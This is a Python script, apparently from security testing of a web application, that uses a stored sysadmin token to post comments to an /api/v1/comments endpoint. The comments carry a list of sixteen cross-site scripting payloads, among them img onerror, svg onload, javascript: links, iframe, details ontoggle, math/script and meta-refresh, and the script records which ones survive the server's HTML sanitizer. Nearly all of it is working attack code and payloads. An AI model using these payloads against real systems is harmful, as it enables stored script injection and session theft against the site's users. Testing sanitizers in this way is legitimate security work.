import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(m,p,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXS'+uuid.uuid4().hex[:5]
# probe what the server sanitizer keeps in message_html
probes=[
 ('bold',      f'<b>{tag}</b>'),
 ('italic',    f'<i>{tag}</i>'),
 ('underline', f'<u>{tag}</u>'),
 ('anchor',    f'<a href="https://example.com">{tag}</a>'),
 ('anchor-js', f'<a href="javascript:alert(1)">{tag}</a>'),
 ('img',       f'<img src=x onerror=alert(1)>{tag}'),
 ('svg',       f'<svg onload=alert(1)>{tag}</svg>'),
 ('iframe',    f'<iframe src="javascript:alert(1)">{tag}</iframe>'),
 ('style',     f'<style>body{{background:red}}</style>{tag}'),
 ('div-onmouse',f'<div onmouseover=alert(1)>{tag}</div>'),
 ('span-style',f'<span style="background:url(javascript:alert(1))">{tag}</span>'),
 ('form',      f'<form action="javascript:alert(1)"><input>{tag}</form>'),
 ('details',   f'<details open ontoggle=alert(1)>{tag}</details>'),
 ('math',      f'<math><mtext><script>alert(1)</script></mtext></math>{tag}'),
 ('base',      f'<base href="javascript:alert(1)//">{tag}'),
 ('meta',      f'<meta http-equiv="refresh" content="0;url=javascript:alert(1)">{tag}'),
]
print(f"{'probe':14} {'POST':>5}  message_html")
for label,msg in probes:
    body={"comment":{"message_raw":msg,"type":"Comment",
                     "commentable_type":"ExceptionRequest","commentable_id":33}}
    c,b=req('POST','/api/v1/comments',body)
    html=None
    if c in ('200','201'):
        try: html=json.loads(b)['comments'][0].get('message_html')
        except: pass
    print(f"  {label:14} {c:>5}  {str(html)[:90]!r}")
